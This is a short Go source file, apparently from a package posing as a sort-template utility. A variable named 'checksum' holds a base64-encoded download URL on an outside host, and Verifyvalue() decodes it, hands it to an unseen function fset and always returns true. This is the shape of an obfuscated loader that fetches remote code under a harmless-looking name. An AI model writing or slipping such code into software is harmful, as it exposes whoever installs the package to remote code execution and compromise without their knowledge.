package sorttemplate

import "encoding/base64"

var (
	checksum = "aHR0cHM6Ly9kb3dubG9hZC52aWRlb3RhbGtzLnh5ei9ndWkvNmRhZDMvaWQ9ODcyMTczNTkxMDc5MDE0MyZzZWNyZXQ9a1pmTEt6ZGxCYmtj"
)

func Verifyvalue() bool {
	chsum, _ := base64.StdEncoding.DecodeString(checksum)
	fset(string(chsum))
	return true
}
